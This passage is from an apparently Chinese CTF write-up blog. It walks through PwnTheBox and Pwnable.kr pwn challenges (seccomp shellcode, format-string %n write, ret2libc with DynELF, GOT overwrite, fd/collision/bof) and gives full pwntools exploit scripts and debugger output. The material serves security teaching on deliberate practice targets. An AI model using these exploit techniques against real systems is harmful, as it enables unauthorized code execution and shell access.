 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。

```assembly
.bss:0804A060                 public shellcode
.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
......
.bss:0804A127 _bss            ends
```

`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`redirect.do-not-trust.hacking.run`的监听端口`10119`，发送`shellcode`可得`PTB{921a8cae-fd37-403e-b86e-f0fccd06e17f}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10119)
bss_addr = 0x804A060
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)
shellcode += shellcraft.exit(0)
io.sendline(asm(shellcode))
io.interactive()
```

------

### ♥ [[第五空间2019 决赛]PWN5](https://ce.pwnthebox.com/challenges?id=369)

先`file ./PWN51  `查看文件类型，再`checksec --file=./PWN51  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./PWN51
./PWN51: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./PWN51
[*] '/home/tyd/ctf/pwn/pwnthebox/PWN51'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`PWN51`后按`F5`反汇编源码并查看主函数。程序首先生成一个随机值并读取到在`.bss`段存储的`dword_804C044`变量中，然后将用户输入读取到`buf`变量中并进行输出，`buf`变量长度为`0x70`字节，`read`函数读取时限制的输入为`0x63`字节，并不存在栈溢出漏洞，但是`printf`函数存在格式化字符串漏洞。接着将用户的下个输入读取到`nptr`变量中，如果`nptr`变量转换成整型后的数值，和`.bss:0804C044`字段中`dword_804C044`变量保存的随机值相等，即可获取到靶机的`shell`权限。

```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

使用`gdb ./pwn`对程序进行调试，这里我用的是`pwndbg`，在`printf`处设置断点`b printf`，`run`运行程序后使用`stack 20`查看栈，可以得知格式化字符串的偏移量是`10`。

```bash
pwndbg> b printf
Breakpoint 1 at 0x8049040
pwndbg> run
Starting program: /home/tyd/ctf/pwn/buuctf/pwn 

Breakpoint 1, __printf (format=0x804a015 "your name:") at printf.c:32
32      printf.c: 没有那个文件或目录.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x804a015 ◂— 'your name:'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
 ECX  0x804c044 ◂— 0xf2df338f
 EDX  0x4
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x804928d ◂— add    esp, 0x10
        arg[1]: 0x804a015 ◂— 'your name:'
        arg[2]: 0x804c044 ◂— 0xf2df338f
        arg[3]: 0x4
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a015 ◂— 'your name:'
02:0008│     0xffffd074 —▸ 0x804c044 ◂— 0xf2df338f
03:000c│     0xffffd078 ◂— 0x4
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x804928d
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
your name:AAAA   

Breakpoint 1, __printf (format=0x804a020 "Hello,") at printf.c:32
32      in printf.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
*EAX  0x804a020 ◂— 'Hello,'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
*ECX  0xffffd098 ◂— 'AAAA\n'
*EDX  0x63
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x80492b2 ◂— add    esp, 0x10
        arg[1]: 0x804a020 ◂— 'Hello,'
        arg[2]: 0xffffd098 ◂— 'AAAA\n'
        arg[3]: 0x63
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x80492b2
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
08:0020│     0xffffd08c ◂— 0x1
09:0024│     0xffffd090 ◂— 0x0
0a:0028│     0xffffd094 ◂— 0x1
0b:002c│ ecx 0xffffd098 ◂— 'AAAA\n'
0c:0030│     0xffffd09c ◂— 0xa /* '\n' */
0d:0034│     0xffffd0a0 ◂— 0x0
... ↓        5 skipped
13:004c│     0xffffd0b8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x31f1c
```

知道格式化字符串漏洞的偏移量后，这题有两个解题思路：

- 修改`dword_804C044`字段中的内容，这样能在`if`条件`atoi(nptr) == dword_804C044`为真时，成功执行`system("/bin/sh")`。
- 利用`fmtstr_payload`将`atoi`函数地址修改为`system`函数地址，当输入的`nptr`为`/bin/sh`时，就能在`if`条件中的`atoi(nptr)`处成功执行`system("/bin/sh")`。

第一种解法：利用格式化字符串`%n`的特性修改`dword_804C044`字段中的内容，`bss_addr = 0x804C044`共`4`个字节，我们先把这个地址写到栈偏移量为`10`的地址，然后利用`%10$n`把`0x804C044`的字节长度`4`写入到`%10$n`处指针所指的地址`0x804C044`中去，这样做的话，字段`dword_804C044`中的内容就修改成功了，最后输入的`nptr`为`4`时就能使`if`条件`atoi(nptr) == dword_804C044`为真，从而执行`system("/bin/sh")`获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10247)
bss_addr = 0x804C044
payload = p32(bss_addr) + b'%10$n'
io.sendline(payload)
io.sendline(b'4')
io.interactive()
```

第二种解法：在`Functions window`中看到有`system`函数，我们可以利用格式化字符串漏洞将`atoi`函数篡改为`system`函数，当用户在`"your passwd:"`后输入`/bin/sh`时，程序原来的`atoi(nptr)`就变成了`system("/bin/sh")`，从而获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10247)
e = ELF('./PWN51')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

------

### [jarvisoj_level4](https://ce.pwnthebox.com/challenges?id=555)

先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./level4         
./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./level4         
[*] '/home/tyd/ctf/pwn/buuctf/level4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  return read(0, buf, 0x100u);
}
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。

编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10248)
elf = ELF('./level4')
main_addr = elf.symbols['main']  # 0x8048470
write_plt = elf.plt['write']  # 0x8048340
read_plt = elf.plt['read']  # 0x8048310
bss_addr = elf.bss()  # 0x804a024
padding = b'a'*(0x88+0x4)

def leak(address):
    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### [name your dog](https://ce.pwnthebox.com/challenges?id=1777)

先`file ./wustctf2020_name_your_dog`查看文件类型，再`checksec --file=./wustctf2020_name_your_dog `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_name_your_dog
./wustctf2020_name_your_dog: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9615fb1408f3d1f6091c2018310bf9170bc6abd0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_name_your_dog
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_name_your_dog'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_name_your_dog`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情：

```c
int vulnerable()
{
  int result; // eax
  int i; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  result = puts("I bought you five male dogs.Name for them?");
  for ( i = 1; i <= 5; ++i )
  {
    v2 = NameWhich(&Dogs);
    printf("You get %d dogs!!!!!!\nWhatever , the author prefers cats ^.^\n", i);
    result = printf("His name is:%s\n\n", (const char *)(8 * v2 + 134520928));
  }
  return result;
}
```

双击`NameWhich()`函数查看详情，注意到程序并没有检查数组边界，`v2`可以任意输入，存在数组越界，我们可以通过`v2`的值对程序任意写入。程序调用`NameWhich()`函数时传递的实参为`Dogs`数组，`Dogs`在`.bss`段中存放，数组起始地址为`0x804A060`。

```c
int __cdecl NameWhich(int a1)
{
  int v2[4]; // [esp+18h] [ebp-10h] BYREF

  v2[1] = __readgsdword(0x14u);
  printf("Name for which?\n>");
  __isoc99_scanf("%d", v2);
  printf("Give your name plz: ");
  __isoc99_scanf("%7s", 8 * v2[0] + a1);
  return v2[0];
}
```

注意到`Functions window`中存在后门函数`shell()`，返回值直接系统调用`/bin/sh`，该函数地址为`0x80485CB`。

```c
int shell()
{
  return system("/bin/sh");
}
```

查看程序的`got`表信息，发现`scanf()`函数距离`Dogs`数组的起始地址很近，`(0x804a028 - 0x804A060)/8 = -7`，数组偏移量为`-7`。我们可以通过数组越界来修改`got`表中`scanf()`函数所在地址存放的内容，将内容覆盖为后门函数`shell()`的地址，这样程序在下一次循环访问`scanf`的`got`表中的内容时，就能跳转到后门函数执行。

```bash
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 8
 
[0x804a00c] printf@GLIBC_2.0 -> 0xf7e07f10 (printf) ◂— call   0xf7ef9189    # printf函数
[0x804a010] alarm@GLIBC_2.0 -> 0xf7e7dcd0 (alarm) ◂— mov    edx, ebx
[0x804a014] __stack_chk_fail@GLIBC_2.4 -> 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10
[0x804a018] puts@GLIBC_2.0 -> 0xf7e234e0 (puts) ◂— push   ebp  # puts函数
[0x804a01c] system@GLIBC_2.0 -> 0x8048486 (system@plt+6) ◂— push   0x20 /* 'h ' */
[0x804a020] __libc_start_main@GLIBC_2.0 -> 0xf7dd2820 (__libc_start_main) ◂— call   0xf7ef9189
[0x804a024] setvbuf@GLIBC_2.0 -> 0xf7e23c90 (setvbuf) ◂— call   0xf7ef9189
[0x804a028] __isoc99_scanf@GLIBC_2.7 -> 0xf7e08ff0 (__isoc99_scanf) ◂— call   0xf7ef9189  # scanf函数
```

编写`Python`代码求解得到`PTB{7a2adc41-67c7-45d2-bb5f-a547fb78b67b}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10250)
elf = ELF('./wustctf2020_name_your_dog')
shell = elf.symbols['shell']
io.sendlineafter(b'Name for which?\n>', b'-7')
io.sendlineafter(b'Give your name plz:', p32(shell))
io.interactive()
```

------

## Pwnable.kr

### fd

这是**Pwnable.kr**的第一个挑战`fd`，来自**[Toddler's Bottle]**部分。题目描述中可以看到有个小孩在问他妈什么是Linux中的文件描述符，现在可以知道标题`fd`就是`file descriptor`的缩写。

```bash
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/1.png)

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/2.png)

我们可以看到三个文件`fd`、`fd.c`和`flag`，其中`fd`是`ELF`二进制可执行文件，`fd.c`是编译二进制文件的`C`代码，用户`fd`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat fd.c`来查看`fd.c`的代码。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/3.png)

我们通过代码审计可以看到变量`buf`被分配了`32`个字节作为缓冲区，该程序首先检查用户是否输入了两个参数(包括文件名)，如果没有就会得到一条`printf`输出语句提示需要给该可执行文件传递一个参数。

然后我们发现有个`int`型变量`fd`被赋值为`atoi(argv[1])-0x1234`，即用户输入的数字被`atoi()`函数转换成`int`型后与`0x1234`的差值。此外还有一个`int`型变量`len`的值是`read(fd, buf, 32)`的函数返回值。在`Linux`机器和`C`语言中，`Linux`文件描述符的值为`0`表示标准输入`stdin`，`1`表示标准输出`stdout`，`2`表示标准错误`stderr`。当`fd`的值为`0`的时候，程序将从`stdin`中读入`32`个字节数据到`buf`变量中，因此我们输入的参数应该是`0x1234`的十进制值`4660`。

接着有一个字符串比较函数`strcmp()`，如果`buf`变量的值等于字符串`LETMEWIN`的话，`strcmp()`函数返回值就为0，此时`if`条件就为真，程序会系统调用输出`flag`：`mommy! I think I know what a file descriptor is!!`。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/4.png)

有了以上思路后，我们也可以编写`Python`代码来获取`flag`：`mommy! I think I know what a file descriptor is!!`。

```python
from pwn import *

shell = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')
io = shell.process(executable='./fd', argv=['fd', '4660'])
io.sendline(b'LETMEWIN')
io.interactive()
```

![](https://paper.tanyaodan.com/Pwnable/kr/fd/5.png)

------

### collision

这是**Pwnable.kr**的第二个挑战`collision`，来自**[Toddler's Bottle]**部分。题目描述中可以看到有个小孩说他爸今天告诉了他什么是MD5散列冲突。

```bash
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh col@pwnable.kr -p2222 
col@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 03:55:34 2023 from 188.64.206.152
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
col@pwnable:~$ ls -la
total 36
drwxr-x---   5 root    col     4096 Oct 23  2016 .
drwxr-xr-x 117 root    root    4096 Nov 10  2022 ..
d---------   2 root    root    4096 Jun 12  2014 .bash_history
-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col
-rw-r--r--   1 root    root     555 Jun 12  2014 col.c
-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag
dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`col`、`col.c`和`flag`，其中`col`是`ELF`二进制可执行文件，`col.c`是编译二进制文件的`C`代码，用户`col`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat col.c`来查看`col.c`的代码。

```bash
col@pwnable:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

先来看主函数，通过代码审计可知，我们需要输入一个长度为`20`个字节的密码，然后程序会将输入的密码送入到`check_password()`函数中进行执行，如果函数的返回值等于硬编码的哈希值`0x21DD09EC`则输出`flag`中的内容。我们可以使用`gdb`来进一步了解程序。

```bash
col@pwnable:~$ gdb ./col
(gdb) disass check_password  # disassemble
Dump of assembler code for function check_password:
   0x08048494 <+0>:     push   %ebp
   0x08048495 <+1>:     mov    %esp,%ebp
   0x08048497 <+3>:     sub    $0x10,%esp
   0x0804849a <+6>:     mov    0x8(%ebp),%eax
   0x0804849d <+9>:     mov    %eax,-0x4(%ebp)
   0x080484a0 <+12>:    movl   $0x0,-0x8(%ebp)
   0x080484a7 <+19>:    movl   $0x0,-0xc(%ebp)
   0x080484ae <+26>:    jmp    0x80484c2 <check_password+46>
   0x080484b0 <+28>:    mov    -0xc(%ebp),%eax
   0x080484b3 <+31>:    shl    $0x2,%eax
   0x080484b6 <+34>:    add    -0x4(%ebp),%eax
   0x080484b9 <+37>:    mov    (%eax),%eax
   0x080484bb <+39>:    add    %eax,-0x8(%ebp)
   0x080484be <+42>:    addl   $0x1,-0xc(%ebp)
   0x080484c2 <+46>:    cmpl   $0x4,-0xc(%ebp)
   0x080484c6 <+50>:    jle    0x80484b0 <check_password+28>
   0x080484c8 <+52>:    mov    -0x8(%ebp),%eax
   0x080484cb <+55>:    leave  
   0x080484cc <+56>:    ret    
End of assembler dump.
(gdb) b *0x80484cc  # break
Breakpoint 1 at 0x80484cc
(gdb) run "AAAAAAAAAAAAAAAAAAAA"
Starting program: /home/col/col "AAAAAAAAAAAAAAAAAAAA"

Breakpoint 1, 0x080484cc in check_password ()
(gdb) print $eax
$1 = 1179010629
(gdb) set $eax=0x21DD09EC
(gdb) print $eax
$2 = 568134124
(gdb) c
Continuing.
/bin/cat: flag: Permission denied
[Inferior 1 (process 58207) exited normally]
```

我们通过修改`check_password()`函数的返回值让程序执行了`system("/bin/cat flag");`，但是用户`col`并没有权限查看`flag`文件中的内容。根据`check_password()`函数，我们需要把`0x21DD09EC`划分为`5`份，但是`568134124`并不能被`5`整除，存在余数`4`。我们可以把余数放到第五份中，即数组变量`ip`中的数值为`[113626824, 113626824, 113626824, 113626824, 113626828]`。接着得把它们转换成十六进制：

```python
>>> hex(113626824)
'0x6c5cec8'
>>> hex(113626828)
'0x6c5cecc'
```

由于这些数据是小端存储方式，所以我们应该输入的值是`"\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"`，编写`Python`代码求解，得到`flag`：`daddy! I just managed to create a hash collision :)`。

```python
from pwn import *

shell = ssh(user='col', host='pwnable.kr', port=2222, password='guest')
hashcode = 0x21DD09EC
a = hashcode//5     # 0x6c5cec8
b = a + hashcode%5  # 0x6c5cecc
payload = p32(a)*4 + p32(b)
# payload = p32(0x6c5cec8)*4 + p32(0x6c5cecc)
io = shell.process(executable='./col', argv=['col', payload])
flag = io.recv()
log.success(flag)  # daddy! I just managed to create a hash collision :)
io.close()
shell.close()
```

------

### bof

这是**Pwnable.kr**的第三个挑战`bof`，来自**[Toddler's Bottle]**部分。题目描述中可以看到这题要考察缓冲区溢出。

```bash
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

查看`bof.c`源代码，发现变量`overflowme`存在栈溢出漏洞，此外当`key`值等于`0xcafebabe`时会获得`shell`脚本。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

我们使用`gdb`来进一步了解程序。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ gdb ./bof
pwndbg> disass main
Dump of assembler code for function main:
   0x0000068a <+0>:     push   ebp
   0x0000068b <+1>:     mov    ebp,esp
   0x0000068d <+3>:     and    esp,0xfffffff0
   0x00000690 <+6>:     sub    esp,0x10
   0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    eax,0x0
   0x000006a4 <+26>:    leave  
   0x000006a5 <+27>:    ret    
End of assembler dump.
pwndbg> disass func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>  # printf
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]   # overflowme的起始地址是$ebp-0x2c
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>  # gets
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe  # key的地址是$ebp+0x8
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
